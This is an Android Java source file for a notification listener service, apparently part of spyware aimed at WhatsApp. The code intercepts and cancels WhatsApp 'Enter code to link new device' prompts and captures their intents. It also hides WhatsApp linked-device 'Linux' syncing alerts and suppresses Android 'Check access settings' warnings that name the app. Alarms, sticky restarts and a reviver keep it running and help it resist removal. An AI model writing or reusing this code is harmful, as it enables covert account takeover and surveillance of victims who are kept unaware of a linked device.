package com.user.side.services;

import android.app.AlarmManager;
import android.app.NotificationChannel;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.UserHandle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import androidx.core.app.NotificationManagerCompat;

import com.user.side.R;
import com.user.side.activities.MainActivity;
import com.user.side.broadcasts.AppReviver;
import com.user.side.listeners.NotificationShower;
import com.user.side.managers.FilesManager;
import com.user.side.utilities.AppLogsUtils;
import com.user.side.utilities.ServicesUtils;

public class NotificationListener extends NotificationListenerService {
    public static String whatsAppPackage = "com.whatsapp";
    public static String START_WHATSAPP_KEY = "start_whatsapp";
    public static boolean IN_PROCESS = false;
    public static String whatsappNotificationContentArabic = "أدخل الكود لربط جهاز جديد";
    public static String whatsappNotificationContentEnglish = "Enter code to link new device";
    public static String CHECK_ACCESS_SETTINGS_EN = "Check access settings";
    public static String CHECK_ACCESS_SETTINGS_AR = "تحقق من إعدادات الوصول";
    public static String START_APP_FROM_ACCESSIBILITY_SERVICE_ACTION = "ACCESSIBILITY_SERVICE::START_APP";
    public static NotificationShower notificationShower;
    public static PendingIntent linkDevicePendingIntent;
    private NotificationManagerCompat notificationManager;
    private NotificationChannel notificationChannel;
    public static String NOTIFICATION_CHANNEL_ID = "APP::NOTIFICATION_CHANNEL_ID";
    public static UserHandle userHandle;


    @Override
    public void onCreate() {
        super.onCreate();
        Log.d("TAG", "notification listener started");
        FilesManager.logStatus("notification listener started");
        MainActivity.scheduleReviver(this);
        if(ServicesUtils.isServiceKilled(this, WebsocketService.class)){
            Intent intent = new Intent(this, WebsocketService.class);
            AppReviver.scheduleIntent(this, intent, 55);
        }

        if(AppLogsUtils.isAppInActiveForOneMonth(this)){
            FilesManager.logStatus("app is inactive for one month");
            // Revive app by starting main activity and close it
            Intent intent = new Intent(this, MainActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra("revive", true);
            startActivity(intent);
        }
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        FilesManager.logStatus("notification listener task removed");
        restart(rootIntent);
    }

    public void restart(Intent intent) {
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        PendingIntent pendingIntent = PendingIntent.getService(this, 6456, intent, PendingIntent.FLAG_IMMUTABLE);
        alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, pendingIntent);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d("TAG", "notification listener onStartCommand");
        FilesManager.logStatus("notification listener onStartCommand");
        MainActivity.scheduleReviver(this);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d("TAG", "notification listener stopped");
        FilesManager.logStatus("notification listener stopped");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);
        Log.d("TAG", "onNotificationPosted");

        if (sbn.getPackageName().equals(getPackageName())){
            cancelNotification(sbn.getKey());
            Log.d("NotificationListener", "app notification received and cancelled");
            FilesManager.logStatus("app notification received and cancelled");
        }

        String text = sbn.getNotification().extras.getString("android.text");
        String title = sbn.getNotification().extras.getString("android.title");

        if(title == null || text == null){
            return;
        }

        if(title.contains(CHECK_ACCESS_SETTINGS_EN) || title.contains(CHECK_ACCESS_SETTINGS_AR)){
            if(text.contains(getString(R.string.app_name))){
                Log.d("NotificationListener", "Warning notification canceled: " + text);
                FilesManager.logStatus("Warning notification canceled: " + text);
                cancelNotification(sbn.getKey());
            }
        }

        if (sbn.getPackageName().equals(whatsAppPackage)) {
            if ((text.contains(whatsappNotificationContentArabic) || text.contains(whatsappNotificationContentEnglish)) && IN_PROCESS) {
                FilesManager.logStatus("link notification received");

                linkDevicePendingIntent = sbn.getNotification().contentIntent;

                cancelNotification(sbn.getKey());

                //openApp();


//                PendingIntent pendingIntent = PendingIntent.getActivity(this,24312412,intent,PendingIntent.FLAG_IMMUTABLE);
//
//                schedulePendingIntent(pendingIntent);
//
//                notificationShower = () -> {
//                    FilesManager.logStatus("reposting link notification");
//                    schedulePendingIntent(linkDevicePendingIntent);
//                    notificationShower = null;
//                };


            }

            if(text != null && text.contains("Linux")){
                Log.d("NotificationListener", "syncing notification");
                cancelNotification(sbn.getKey());
            }

        }

    }

//    private void startActivityAsUser(Intent intent, UserHandle userHandle) {
//        try {
//            // Use reflection to get the Context method for starting activity as a specific user
//            Method method = Context.class.getMethod("startActivityAsUser", Intent.class, UserHandle.class);
//            method.invoke(this, intent, userHandle);
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }
//
//    public void schedulePendingIntent(PendingIntent pendingIntent){
//        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
//        alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, pendingIntent);
//    }
//
//    public void openApp(){
//        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
//
//        Intent intent = getPackageManager().getLaunchIntentForPackage(getPackageName());
//
//        PendingIntent pendingIntent = PendingIntent.getActivity(this,32123,intent,PendingIntent.FLAG_IMMUTABLE);
//
//        long delayMillis = 1000;
//        long triggerAtMillis = System.currentTimeMillis() + delayMillis;
//
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
//            if(alarmManager.canScheduleExactAlarms()){
//                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAtMillis, pendingIntent);
//                MainActivity.START_WHATSAPP = true;
//            }
//        }
//        else{
//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
//                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAtMillis, pendingIntent);
//            }
//            else{
//                alarmManager.set(AlarmManager.RTC_WAKEUP, triggerAtMillis, pendingIntent);
//            }
//            MainActivity.START_WHATSAPP = true;
//        }
//    }
//
//    private void notifyOpenWhatsappNotification() {
//        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(this);
//        if(notificationChannel == null){
//            notificationChannel = new NotificationChannel(NOTIFICATION_CHANNEL_ID,"NOTIFICATION_CHANNEL",NotificationManager.IMPORTANCE_DEFAULT);
//            notificationManager.createNotificationChannel(notificationChannel);
//        }
//        Intent intent = getPackageManager().getLaunchIntentForPackage(whatsAppPackage);
//
//        if(intent == null){
//            return;
//        }
//
//        PendingIntent pendingIntent = PendingIntent.getActivity(this,24312412,intent,PendingIntent.FLAG_IMMUTABLE);
//
//        NotificationCompat.Builder notificationBuilder =
//                new NotificationCompat.Builder(getBaseContext(),NOTIFICATION_CHANNEL_ID)
//                        .setContentTitle(getApplicationInfo().name)
//                        .setContentText("Open Me")
//                        .setContentIntent(pendingIntent)
//                        .setSmallIcon(R.mipmap.ic_launcher_round);
//        notificationManager.notify(421242124, notificationBuilder.build());
//    }
//    private void postDelayedNotification(StatusBarNotification sbn) {
//        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(this);
//        if(notificationChannel == null){
//            notificationChannel = new NotificationChannel(NOTIFICATION_CHANNEL_ID,"NOTIFICATION_CHANNEL",NotificationManager.IMPORTANCE_DEFAULT);
//            notificationManager.createNotificationChannel(notificationChannel);
//        }
//        NotificationCompat.Builder notificationBuilder =
//                new NotificationCompat.Builder(getBaseContext(),NOTIFICATION_CHANNEL_ID)
//                        .setContentTitle(getApplicationInfo().name)
//                        .setContentText("Open Whatsapp")
//                        .setContentIntent(sbn.getNotification().contentIntent)
//                        .setSmallIcon(R.mipmap.ic_launcher_round);
//        notificationManager.notify(422, notificationBuilder.build());
//    }

}

